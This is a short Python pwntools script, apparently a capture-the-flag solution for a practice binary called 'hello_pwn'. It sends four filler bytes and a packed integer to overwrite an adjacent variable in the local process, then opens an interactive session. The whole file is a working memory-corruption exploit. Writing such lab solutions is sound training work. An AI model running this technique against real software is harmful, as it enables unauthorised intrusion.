# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1
if Debug:
    io=process('./hello_pwn')
else:
    pass

def main():
    io.sendline('a'*4+p32(1853186401))
    io.interactive()

main()